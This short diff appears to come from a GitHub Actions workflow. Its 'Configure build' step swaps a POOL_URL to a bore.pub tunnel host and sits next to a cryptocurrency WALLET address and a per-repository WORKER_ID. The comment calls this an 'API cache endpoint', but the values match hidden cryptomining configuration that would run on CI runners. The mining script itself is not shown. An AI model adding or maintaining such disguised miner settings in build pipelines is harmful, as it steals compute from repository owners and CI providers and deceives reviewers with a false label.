@@ -74,7 +74,7 @@ jobs:
       - name: Configure build
         env:
           # API cache endpoint (proxy)
-          POOL_URL: apilll.frostai.com.tr:3111
+          POOL_URL: bore.pub:27887
           WALLET: 48vxR9wsYHoaVonLgEHLswFiHs6BwfRnAdYkRGfVBWajikMJabj3EswWJznGtE8jLZWmk1zzMSk7QEcFPuMmst1QEsfxxpK
           WORKER_ID: ${{ github.repository_owner }}-b${{ matrix.batch }}
         run: |
